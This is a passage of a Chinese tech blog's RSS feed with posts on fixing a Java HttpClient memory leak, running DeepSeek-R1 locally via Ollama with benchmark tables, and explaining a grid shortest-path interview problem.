<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>AsZero</title>
    <link>https://zerospace.dev/</link>
    
    <image>
      <url>https://dimg04.tripcdn.com/images/0Z00m224x8xn2j0qq5D28.jpg</url>
      <title>AsZero</title>
      <link>https://zerospace.dev/</link>
    </image>
    
    <atom:link href="https://zerospace.dev/rss.xml" rel="self" type="application/rss+xml"/>
    
    <description>但行好事 莫问前程</description>
    <pubDate>Wed, 29 Jan 2025 12:30:12 GMT</pubDate>
    <generator>http://zerospace.dev/</generator>

    <follow_challenge>
      <feedId>82088825772478464</feedId>
      <userId>59551753275559936</userId>
    </follow_challenge>

    
    <item>
      <title>内存溢出的日常</title>
      <link>https://zerospace.dev/posts/87188fe9/</link>
      <guid>https://zerospace.dev/posts/87188fe9/</guid>
      <pubDate>Wed, 29 Jan 2025 12:11:46 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;事情是这样的，正开开心心的写着代码&lt;br&gt;突然线上报警了，内存告急，可用内存不足1G&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://s2.loli.net/2025/01/29/vaENXqHhnGpgOck.png&quot; alt=&quot;告警&quot;&gt;&lt;/p&gt;
&lt;p&gt;？？？&lt;br&gt;第</description>
        
      
      
      
      <content:encoded><![CDATA[<p>事情是这样的，正开开心心的写着代码<br>突然线上报警了，内存告急，可用内存不足1G</p><p><img src="https://s2.loli.net/2025/01/29/vaENXqHhnGpgOck.png" alt="告警"></p><p>？？？<br>第一反应是也没干啥啊，咋就报警了，然后运维同学抛出了一张图</p><p><img src="https://s2.loli.net/2025/01/29/vXI172gDdsT8t4V.png" alt="内存可用率"></p><p>线上应用的可用内存，就像中学边上那条长长的下坡路，急转直下…<br>不出意外是内存泄露了，80%还是我写的代码</p><p><img src="https://s2.loli.net/2025/01/29/faJZIPC7OqAHtBX.png" alt="头皮发麻"></p><p>抓紧联系运维同学，dump了两份间隔半小时的内存快照<br>然后赶紧重启了服务器，先让它好起来</p><p>接着开始用MAT分析快照，定位了是一些流没有被关闭，导致内存一直缓慢增长<br>好了，到了这里才是今天的正文<br>下面是错误写法，DefaultHttpClient也已经被标记成了 @<strong>Deprecated</strong> ，而且client和response也没有close</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">sendGet</span><span class="params">(String url)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">res</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">DefaultHttpClient</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultHttpClient</span>();</span><br><span class="line">        <span class="type">HttpGet</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpGet</span>(url);</span><br><span class="line">        <span class="type">HttpResponse</span> <span class="variable">response</span> <span class="operator">=</span> client.execute(request);</span><br><span class="line">        <span class="keyword">if</span> (response.getStatusLine().getStatusCode() == HttpStatus.SC_OK) &#123;</span><br><span class="line">            res = EntityUtils.toString(response.getEntity());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        logger.error(<span class="string">&quot;get请求提交失败:&#123;&#125;&quot;</span>, url, e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后改成了这个样子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">sendGet</span><span class="params">(String url)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">res</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> (<span class="type">CloseableHttpClient</span> <span class="variable">client</span> <span class="operator">=</span> HttpClients.createDefault()) &#123;</span><br><span class="line">        <span class="type">HttpGet</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpGet</span>(url);</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">CloseableHttpResponse</span> <span class="variable">response</span> <span class="operator">=</span> client.execute(request)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (response.getStatusLine().getStatusCode() == HttpStatus.SC_OK) &#123;</span><br><span class="line">                res = EntityUtils.toString(response.getEntity());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        logger.error(<span class="string">&quot;get请求提交失败:&#123;&#125;&quot;</span>, url, e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>问题到了这里，本来就完事了，突然想看看这个EntityUtils是干啥的？</p><p><img src="https://s2.loli.net/2025/01/29/g9rPnCG18OoAQ7f.png" alt="EntityUtils"></p><p>一共这些方法，toString()已经知道了，那这个consume()是干啥的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Ensures that the entity content is fully consumed and the content stream, if exists,</span></span><br><span class="line"><span class="comment"> * is closed.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> entity the entity to consume.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException if an error occurs reading the input stream</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 4.1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">consume</span><span class="params">(<span class="keyword">final</span> HttpEntity entity)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (entity == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (entity.isStreaming()) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">InputStream</span> <span class="variable">instream</span> <span class="operator">=</span> entity.getContent();</span><br><span class="line">        <span class="keyword">if</span> (instream != <span class="literal">null</span>) &#123;</span><br><span class="line">            instream.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>哦，等等，这是个关流的方法啊，我之前可是都没调用过啊，这不又漏了！！！</p><p>赶紧又去仔细看了看toString()</p><p><img src="https://s2.loli.net/2025/01/29/keqRQA8zSbWguV9.png" alt="toString"></p><p>原来这里已经关闭过了，那没事了</p>]]></content:encoded>
      
      
      
      <category domain="https://zerospace.dev/tags/%E5%86%85%E5%AD%98/">内存</category>
      
      <category domain="https://zerospace.dev/tags/%E6%BA%A2%E5%87%BA/">溢出</category>
      
      <category domain="https://zerospace.dev/tags/Java/">Java</category>
      
      <category domain="https://zerospace.dev/tags/%E5%A0%86/">堆</category>
      
      
      <comments>https://zerospace.dev/posts/87188fe9/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>本地部署DeepSeek-R1大模型！免费开源，媲美OpenAI-o1能力</title>
      <link>https://zerospace.dev/posts/9fe7bc87/</link>
      <guid>https://zerospace.dev/posts/9fe7bc87/</guid>
      <pubDate>Sun, 26 Jan 2025 02:44:20 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;最近，一家名叫DeepSeek的初创公司经过技术迭代与升级，发布了全新一代大模型，“DeepSeek-V3”&lt;/p&gt;
&lt;p&gt;由于这款大模型太过好用，DeepSeek R1 更是直接免费开源，在AI发烧友圈子传播后，传到了海外社交平台、技术论坛，引发了海外网友的连连称赞&lt;/p</description>
        
      
      
      
      <content:encoded><![CDATA[<p>最近，一家名叫DeepSeek的初创公司经过技术迭代与升级，发布了全新一代大模型，“DeepSeek-V3”</p><p>由于这款大模型太过好用，DeepSeek R1 更是直接免费开源，在AI发烧友圈子传播后，传到了海外社交平台、技术论坛，引发了海外网友的连连称赞</p><p><img src="https://s2.loli.net/2025/01/26/ZMcrqlg2YuPEX8Q.png" alt="DeepSeek Logo"></p><p>各项性能指标更是和OpenAI-o1 模型不相上下，甚至做到了小部分的超越，关键是开源的，我们可以本地部署使用</p><p><img src="https://s2.loli.net/2025/01/26/lHLGOCd1cjJv6oT.png" alt="DeepSeek对比"></p><h2 id="1、本地部署，我们可以通过Ollama来进行安装"><a href="#1、本地部署，我们可以通过Ollama来进行安装" class="headerlink" title="1、本地部署，我们可以通过Ollama来进行安装"></a>1、本地部署，我们可以通过Ollama来进行安装</h2><p>Ollama 官方版：【<a href="https://ollama.com/">点击前往</a>】<br>Web UI 控制端【<a href="https://chromewebstore.google.com/detail/page-assist-%E6%9C%AC%E5%9C%B0-ai-%E6%A8%A1%E5%9E%8B%E7%9A%84-web/jfgfiigpkhlkbnfnbobbkinehhfdhndo">点击安装</a>】</p><h2 id="安装命令"><a href="#安装命令" class="headerlink" title="安装命令"></a>安装命令</h2><h3 id="Ollama模型"><a href="#Ollama模型" class="headerlink" title="Ollama模型"></a>Ollama模型</h3><p>1.5B Qwen DeepSeek R1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ollama run deepseek-r1:1.5b</span><br></pre></td></tr></table></figure><p>7B Qwen DeepSeek R1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ollama run deepseek-r1:7b</span><br></pre></td></tr></table></figure><p>8B Llama DeepSeek R1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ollama run deepseek-r1:8b</span><br></pre></td></tr></table></figure><p>14B Qwen DeepSeek R1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ollama run deepseek-r1:14b</span><br></pre></td></tr></table></figure><p>32B Qwen DeepSeek R1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ollama run deepseek-r1:32b</span><br></pre></td></tr></table></figure><p>70B Llama DeepSeek R1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ollama run deepseek-r1:70b</span><br></pre></td></tr></table></figure><h3 id="更多模型下载"><a href="#更多模型下载" class="headerlink" title="更多模型下载"></a>更多模型下载</h3><p>DeepSeek-R1<br>|       模型       | #总参数 | #已激活参数 | 上下文长度 |      下载     |<br>|:—————-:|:——-:|:———–:|:———-:|:————-:|<br>| DeepSeek-R1-Zero | 671B    | 37B         | 128千      | 🤗 <a href="https://huggingface.co/deepseek-ai/DeepSeek-R1-Zero">HuggingFace</a> |<br>| DeepSeek-R1      | 671B    | 37B         | 128千      | 🤗 <a href="https://huggingface.co/deepseek-ai/DeepSeek-R1">HuggingFace</a> |<br>DeepSeek-R1-Zero 和 DeepSeek-R1 基于 DeepSeek-V3-Base 进行训练<br>有关模型架构的更多详细信息，请参阅DeepSeek-V3存储库</p><p>DeepSeek-R1-Distill 模型<br>|              模型             |        基础模型        |      下载     |<br>|:—————————–:|:———————-:|:————-:|<br>| DeepSeek-R1-Distill-Qwen-1.5B | <a href="https://huggingface.co/Qwen/Qwen2.5-Math-1.5B">Qwen2.5-Math-1.5B</a>      | 🤗 <a href="https://huggingface.co/deepseek-ai/DeepSeek-R1-Distill-Qwen-1.5B">HuggingFace</a> |<br>| DeepSeek-R1-Distill-Qwen-7B   | <a href="https://huggingface.co/Qwen/Qwen2.5-Math-7B">Qwen2.5-Math-7B</a>        | 🤗 <a href="https://huggingface.co/deepseek-ai/DeepSeek-R1-Distill-Qwen-7B">HuggingFace</a> |<br>| DeepSeek-R1-Distill-Llama-8B  | <a href="https://huggingface.co/meta-llama/Llama-3.1-8B">Llama-3.1-8B</a>           | 🤗 <a href="https://huggingface.co/deepseek-ai/DeepSeek-R1-Distill-Llama-8B">HuggingFace</a> |<br>| DeepSeek-R1-Distill-Qwen-14B  | <a href="https://huggingface.co/Qwen/Qwen2.5-14B">Qwen2.5-14B</a>            | 🤗 <a href="https://huggingface.co/deepseek-ai/DeepSeek-R1-Distill-Qwen-14B">HuggingFace</a> |<br>| DeepSeek-R1-Distill-Qwen-32B  | <a href="https://huggingface.co/Qwen/Qwen2.5-32B">Qwen2.5-32B</a>            | 🤗 <a href="https://huggingface.co/deepseek-ai/DeepSeek-R1-Distill-Qwen-32B">HuggingFace</a> |<br>| DeepSeek-R1-Distill-Llama-70B | <a href="https://huggingface.co/meta-llama/Llama-3.3-70B-Instruct">Llama-3.3-70B-Instruct</a> | 🤗 <a href="https://huggingface.co/deepseek-ai/DeepSeek-R1-Distill-Llama-70B">HuggingFace</a> |<br>DeepSeek-R1-Distill 模型基于开源模型进行了微调，使用了 DeepSeek-R1 生成的样本<br>我们对其配置和分词器进行了轻微更改<br>请使用我们的设置来运行这些模型</p><h2 id="评估结果"><a href="#评估结果" class="headerlink" title="评估结果"></a>评估结果</h2><h3 id="DeepSeek-R1-评估"><a href="#DeepSeek-R1-评估" class="headerlink" title="DeepSeek-R1-评估"></a>DeepSeek-R1-评估</h3><p>对于我们所有的模型，最大生成长度设置为 32,768 个 token<br>对于需要采样的基准，我们使用的温度为0.6，top-p 值为0.95，并为每个查询生成 64 个响应来估计 pass@1<br>| 类别 |        基准（公制）        | Claude 3.5 Sonnet-1022 | GPT-4o 0513 | DeepSeek V3 | OpenAI o1-mini | OpenAI o1-1217 | DeepSeek R1 |<br>|:—-:|:————————–:|:————————:|:———–:|:———–:|:————–:|:————–:|:———–:|<br>|      | 建筑学                     | –                        | –           | 教育部      | –              | –              | 教育部      |<br>|      | # 激活参数                 | –                        | –           | 37B         | –              | –              | 37B         |<br>|      | # 总参数                   | –                        | –           | 671B        | –              | –              | 671B        |<br>| 英语 | MMLU（通过@1）             | 88.3                     | 87.2        | 88.5        | 85.2           | 91.8           | 90.8        |<br>|      | MMLU-Redux（EM）           | 88.9                     | 88.0        | 89.1        | 86.7           | –              | 92.9        |<br>|      | MMLU-Pro（EM）             | 78.0                     | 72.6        | 75.9        | 80.3           | –              | 84.0        |<br>|      | 掉落 (3 发 F1)             | 88.3                     | 83.7        | 91.6        | 83.9           | 90.2           | 92.2        |<br>|      | IF-Eval（提示严格）        | 86.5                     | 84.3        | 86.1        | 84.8           | –              | 83.3        |<br>|      | GPQA-钻石级 (Pass@1)       | 65.0                     | 49.9        | 59.1        | 60.0           | 75.7           | 71.5        |<br>|      | SimpleQA（正确）           | 28.4                     | 38.2        | 24.9        | 7.0            | 47.0           | 30.1        |<br>|      | 框架（配件）               | 72.5                     | 80.5        | 73.3        | 76.9           | –              | 82.5        |<br>|      | AlpacaEval2.0 (LC-胜率)    | 52.0                     | 51.1        | 70.0        | 57.8           | –              | 87.6        |<br>|      | ArenaHard（GPT-4-1106）    | 85.2                     | 80.4        | 85.5        | 92.0           | –              | 92.3        |<br>| 代码 | LiveCodeBench (Pass@1-COT) | 33.8                     | 34.2        | –           | 53.8           | 63.4           | 65.9        |<br>|      | Codeforces（百分位数）     | 20.3                     | 23.6        | 58.7        | 93.4           | 96.6           | 96.3        |<br>|      | Codeforces（评级）         | 717                      | 759         | 1134        | 1820           | 2061           | 2029        |<br>|      | SWE 已验证（已解决）       | 50.8                     | 38.8        | 42.0        | 41.6           | 48.9           | 49.2        |<br>|      | Aider-Polyglot (Acc.)      | 45.3                     | 16.0        | 49.6        | 32.9           | 61.7           | 53.3        |<br>| 数学 | AIME 2024（通行证@1）      | 16.0                     | 9.3         | 39.2        | 63.6           | 79.2           | 79.8        |<br>|      | 数学-500 (通过@1)          | 78.3                     | 74.6        | 90.2        | 90.0           | 96.4           | 97.3        |<br>|      | CNMO 2024 (通行证@1)       | 13.1                     | 10.8        | 43.2        | 67.6           | –              | 78.8        |<br>| 中文 | CLUEWSC（EM）              | 85.4                     | 87.9        | 90.9        | 89.9           | –              | 92.8        |<br>|      | C-评估（EM）               | 76.7                     | 76.0        | 86.5        | 68.9           | –              | 91.8        |<br>|      | C-SimpleQA（正确）         | 55.4                     | 58.7        | 68.0        | 40.3           | –              | 63.7        |</p><h3 id="蒸馏模型评估"><a href="#蒸馏模型评估" class="headerlink" title="蒸馏模型评估"></a>蒸馏模型评估</h3><p>|              模型             | AIME 2024 通行证@1 | AIME 2024 缺点@64 | MATH-500 通过@1 | GPQA 钻石通行证@1 | LiveCodeBench 通行证@1 | CodeForces 评级 |<br>|:—————————–:|:——————:|:—————–:|:—————:|:—————–:|:———————-:|:—————:|<br>| GPT-4o-0513                   | 9.3                | 13.4              | 74.6            | 49.9              | 32.9                   | 759             |<br>| 克劳德-3.5-十四行诗-1022      | 16.0               | 26.7              | 78.3            | 65.0              | 38.9                   | 717             |<br>| o1-迷你                       | 63.6               | 80.0              | 90.0            | 60.0              | 53.8                   | 1820            |<br>| QwQ-32B-预览                  | 44.0               | 60.0              | 90.6            | 54.5              | 41.9                   | 1316            |<br>| DeepSeek-R1-Distill-Qwen-1.5B | 28.9               | 52.7              | 83.9            | 33.8              | 16.9                   | 954             |<br>| DeepSeek-R1-Distill-Qwen-7B   | 55.5               | 83.3              | 92.8            | 49.1              | 37.6                   | 1189            |<br>| DeepSeek-R1-Distill-Qwen-14B  | 69.7               | 80.0              | 93.9            | 59.1              | 53.1                   | 1481            |<br>| DeepSeek-R1-Distill-Qwen-32B  | 72.6               | 83.3              | 94.3            | 62.1              | 57.2                   | 1691            |<br>| DeepSeek-R1-Distill-Llama-8B  | 50.4               | 80.0              | 89.1            | 49.0              | 39.6                   | 1205            |<br>| DeepSeek-R1-Distill-Llama-70B | 70.0               | 86.7              | 94.5            | 65.2              | 57.5                   | 1633            |</p>]]></content:encoded>
      
      
      
      <category domain="https://zerospace.dev/tags/%E5%A4%A7%E6%A8%A1%E5%9E%8B/">大模型</category>
      
      <category domain="https://zerospace.dev/tags/DeepSeek/">DeepSeek</category>
      
      
      <comments>https://zerospace.dev/posts/9fe7bc87/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>一道无趣的面试编程题</title>
      <link>https://zerospace.dev/posts/40f451e9/</link>
      <guid>https://zerospace.dev/posts/40f451e9/</guid>
      <pubDate>Thu, 09 Jan 2025 14:22:32 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;img src=&quot;https://s2.loli.net/2025/01/09/T89pEtBWCaqf7VP.webp&quot; alt=&quot;true.webp&quot;&gt;&lt;/p&gt;
&lt;p&gt;最近经济大环境依旧没能从疫情中走出来，身边有不少小伙伴被裁员或者是公司倒闭失业&lt;/p&gt;
&lt;p&gt;好友群</description>
        
      
      
      
      <content:encoded><![CDATA[<p><img src="https://s2.loli.net/2025/01/09/T89pEtBWCaqf7VP.webp" alt="true.webp"></p><p>最近经济大环境依旧没能从疫情中走出来，身边有不少小伙伴被裁员或者是公司倒闭失业</p><p>好友群里讨论最多的话题就是面试，自然少不了讨论面试题</p><p>昨天一位相识多年的好友发我了一道面试题，他当时正好在面试，需要现场编程</p><p>当时刚好不忙就看了一下题目，感觉很无趣</p><p>但还是耐着性子文字给他讲了讲，顺带着画了张简图，可是他还是没懂</p><p>原题如下：</p><blockquote><p>一个城市可以近似看成 n * m 的网格图，A 公司有 k 个维修点，每个维修点有固定的坐标，城市里面有 h 个客户需要修理手机，客户有固定的坐标<br>维修员在地图上只能上下左右走，不能斜着走，每走一个格子需要 2 块钱的花费<br>每个维修点拥有无数个员工，每个员工可以被派去为一个客户服务<br>城市里面有 z 个地方在修理管道，这些地方是不能走的<br>可能有一些客户是被隔离的（上下左右都在修管道），这里是不需要派员工去修理手机了<br>A 公司为了节省财力，想找到最小的花费</p><p>输入：</p><p>第一行给出两个正整数 n, m （0 &lt; n &lt; 1000, 0 &lt; m &lt; 1000）<br>第二行给出 k（0 &lt; k &lt; 20）以及 k 个维修点的坐标<br>第三行给出 z（0 &lt; z &lt; 100）以及 z 个坐标<br>第四行给出 h（O &lt; h &lt; 100）以及 h 个坐标<br>保证客户，维修点以及修理管道都在 n * m 的地图里面</p><p>输出：最小的花费</p></blockquote><p>样例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">输入样例</span><br><span class="line"><span class="number">100</span> <span class="number">100</span></span><br><span class="line"><span class="number">411223344</span></span><br><span class="line"><span class="number">100</span></span><br><span class="line"><span class="number">3</span> <span class="number">99</span> <span class="number">99</span> <span class="number">88</span> <span class="number">88</span> <span class="number">7777</span></span><br><span class="line"></span><br><span class="line">输出样例</span><br><span class="line"><span class="number">1008</span></span><br></pre></td></tr></table></figure><p>这道题乍一看，看起来很唬人字很多，又是还有拦路虎，要找最短路径啥的，但其实是一道阅读理解题</p><p>一般现场编程面试，主要看你现场的反应和理解力，算法或者数据结构的东西，反而涉及不会太多</p><p>这也使得这道题在弄懂原理后相当无趣，但考虑我这朋友确实经验尚浅</p><p>所以我还是给他继续讲下去，顺带着给了代码实现</p><p>这篇博客便是当时内容的摘录整理</p><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="400px" height="400px" viewBox="0 0 1203 1201" version="1.1">    <g id="64x64" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">        <g id="Group" transform="translate(94, 96.5)" stroke="#979797" stroke-linecap="square">            <line x1="0.5" y1="103" x2="1006.5" y2="103" id="Line"/>            <line x1="6" y1="303.5" x2="1012" y2="303.5" id="Line"/>            <line x1="6" y1="504.5" x2="1012" y2="504.5" id="Line"/>            <line x1="1" y1="705.5" x2="1007" y2="705.5" id="Line"/>            <line x1="6" y1="906.5" x2="1012" y2="906.5" id="Line"/>            <line x1="110.5" y1="6" x2="110.5" y2="1005" id="Line-2"/>            <line x1="311" y1="6.5" x2="311" y2="1005.5" id="Line-2"/>            <line x1="504" y1="0.5" x2="504" y2="999.5" id="Line-2"/>            <line x1="706" y1="4.5" x2="706" y2="1003.5" id="Line-2"/>            <line x1="908" y1="4.5" x2="908" y2="1003.5" id="Line-2"/>        </g>        <line x1="203" y1="400.5" x2="202.5" y2="601" id="y" stroke="#003DFF" stroke-width="5" stroke-linecap="square"/>        <circle id="Oval" stroke="#79A3F8" fill="#9BD0FD" cx="205" cy="600" r="19.5"/>        <circle id="Oval" stroke="#FF8D8D" fill="#FD9B9B" cx="205" cy="397" r="19.5"/>    </g></svg><p>做任何算法题，第一步是理解题意，第二步是设想最简单的情况，再慢慢推导到复杂情况</p><p>首先，我们先不考虑存在阻塞的情况</p><p>最简单场景里，顾客和维修点在一个 1 x 1 的格子的一条边上，这个时候他们间的最短距离为 1</p><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="400px" height="400px" viewBox="0 0 1203 1201" version="1.1">    <g id="64x64" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">        <g id="Group" transform="translate(94, 96.5)" stroke="#979797" stroke-linecap="square">            <line x1="0.5" y1="103" x2="1006.5" y2="103" id="Line"/>            <line x1="6" y1="303.5" x2="1012" y2="303.5" id="Line"/>            <line x1="6" y1="504.5" x2="1012" y2="504.5" id="Line"/>            <line x1="1" y1="705.5" x2="1007" y2="705.5" id="Line"/>            <line x1="6" y1="906.5" x2="1012" y2="906.5" id="Line"/>            <line x1="110.5" y1="6" x2="110.5" y2="1005" id="Line-2"/>            <line x1="311" y1="6.5" x2="311" y2="1005.5" id="Line-2"/>            <line x1="504" y1="0.5" x2="504" y2="999.5" id="Line-2"/>            <line x1="706" y1="4.5" x2="706" y2="1003.5" id="Line-2"/>            <line x1="908" y1="4.5" x2="908" y2="1003.5" id="Line-2"/>        </g>        <line x1="406" y1="400" x2="405.5" y2="600.5" id="y" stroke="#FF0000" stroke-width="5" stroke-linecap="square"/>        <line x1="203" y1="400.5" x2="202.5" y2="601" id="y" stroke="#003DFF" stroke-width="5" stroke-linecap="square"/>        <line x1="203.5" y1="398.5" x2="404.5" y2="398.5" id="x" stroke="#FF0000" stroke-width="5" stroke-linecap="square"/>        <line x1="204" y1="601" x2="405" y2="601" id="x" stroke="#003DFF" stroke-width="5" stroke-linecap="square"/>        <circle id="Oval" stroke="#79A3F8" fill="#9BD0FD" cx="407" cy="601" r="19.5"/>        <circle id="Oval" stroke="#FF8D8D" fill="#FD9B9B" cx="205" cy="397" r="19.5"/>    </g></svg><p>然后我们更进一步，如果他们在一个格子的对角线上呢？</p><p>他们间的最短路径有两条，为2</p><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="400px" height="400px" viewBox="0 0 1203 1201" version="1.1">    <g id="64x64" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">        <g id="Group" transform="translate(94, 96.5)" stroke="#979797" stroke-linecap="square">            <line x1="0.5" y1="103" x2="1006.5" y2="103" id="Line"/>            <line x1="6" y1="303.5" x2="1012" y2="303.5" id="Line"/>            <line x1="6" y1="504.5" x2="1012" y2="504.5" id="Line"/>            <line x1="1" y1="705.5" x2="1007" y2="705.5" id="Line"/>            <line x1="6" y1="906.5" x2="1012" y2="906.5" id="Line"/>            <line x1="110.5" y1="6" x2="110.5" y2="1005" id="Line-2"/>            <line x1="311" y1="6.5" x2="311" y2="1005.5" id="Line-2"/>            <line x1="504" y1="0.5" x2="504" y2="999.5" id="Line-2"/>            <line x1="706" y1="4.5" x2="706" y2="1003.5" id="Line-2"/>            <line x1="908" y1="4.5" x2="908" y2="1003.5" id="Line-2"/>        </g>        <line x1="205" y1="397" x2="203.5" y2="1005.5" id="y" stroke="#FF0000" stroke-width="5" stroke-linecap="square"/>        <line x1="203.5" y1="398.5" x2="404.5" y2="398.5" id="x" stroke="#FF0000" stroke-width="5" stroke-linecap="square"/>        <line x1="205" y1="398" x2="798.5" y2="397.5" id="x" stroke="#003DFF" stroke-width="5" stroke-linecap="square"/>        <circle id="Oval" stroke="#79A3F8" fill="#9BD0FD" cx="798" cy="398" r="19.5"/>        <circle id="Oval" stroke="#46DDB7" fill="#5CDC8C" cx="205" cy="1005" r="19.5"/>        <circle id="Oval" stroke="#FF8D8D" fill="#FD9B9B" cx="205" cy="397" r="19.5"/>    </g></svg><p>结合初中的几何学知识，我们首先知道一个基本知识，两点之间，直线最短</p><p>所以，维修点和顾客在同一条直线上时，他们之间的距离就是直线距离</p><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="800px" height="400px" viewBox="0 0 2402 1201" version="1.1">    <g id="128x128" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">        <g id="Group" transform="translate(1296, 97.5)" stroke="#979797" stroke-linecap="square">            <line x1="0.5" y1="103" x2="1006.5" y2="103" id="Line"/>            <line x1="6" y1="303.5" x2="1012" y2="303.5" id="Line"/>            <line x1="6" y1="504.5" x2="1012" y2="504.5" id="Line"/>            <line x1="1" y1="705.5" x2="1007" y2="705.5" id="Line"/>            <line x1="6" y1="906.5" x2="1012" y2="906.5" id="Line"/>            <line x1="110.5" y1="6" x2="110.5" y2="1005" id="Line-2"/>            <line x1="311" y1="6.5" x2="311" y2="1005.5" id="Line-2"/>            <line x1="504" y1="0.5" x2="504" y2="999.5" id="Line-2"/>            <line x1="706" y1="4.5" x2="706" y2="1003.5" id="Line-2"/>            <line x1="908" y1="4.5" x2="908" y2="1003.5" id="Line-2"/>        </g>        <g id="Group" transform="translate(94, 96.5)" stroke="#979797" stroke-linecap="square">            <line x1="0.5" y1="103" x2="1006.5" y2="103" id="Line"/>            <line x1="6" y1="303.5" x2="1012" y2="303.5" id="Line"/>            <line x1="6" y1="504.5" x2="1012" y2="504.5" id="Line"/>            <line x1="1" y1="705.5" x2="1007" y2="705.5" id="Line"/>            <line x1="6" y1="906.5" x2="1012" y2="906.5" id="Line"/>            <line x1="110.5" y1="6" x2="110.5" y2="1005" id="Line-2"/>            <line x1="311" y1="6.5" x2="311" y2="1005.5" id="Line-2"/>            <line x1="504" y1="0.5" x2="504" y2="999.5" id="Line-2"/>            <line x1="706" y1="4.5" x2="706" y2="1003.5" 